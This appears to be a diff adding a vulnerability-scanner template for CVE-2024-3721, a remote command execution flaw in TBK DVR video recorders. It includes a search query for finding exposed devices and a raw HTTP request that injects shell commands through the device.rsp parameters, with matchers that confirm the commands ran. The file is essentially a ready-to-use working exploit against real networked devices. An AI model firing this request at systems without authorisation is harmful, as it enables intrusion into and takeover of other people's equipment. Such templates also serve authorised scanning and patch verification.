@@ -1,0 +1,32 @@
+id: tbk-dvr-rce-device
+
+info:
+  name: "TBK DVR硬盘录像机 device接口远程命令执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: "Location: /login.rsp"
+      TBK DVR硬盘录像机 device接口处存在CVE-2024-3721远程代码执行漏洞，攻击者可通过构造恶意请求在目标系统上执行任意命令，导致服务器敏感数据泄露及系统控制权丧失。
+  reference:
+  - CVE-2024-3721
+  tags: TBK
+
+http:
+- raw:
+  - |
+    GET /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=uname%20-a;id;echo%20888888 HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: uid=1
+
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+      - '888888'
+  - type: regex
+    part: body
+    regex:
+      - "uid="
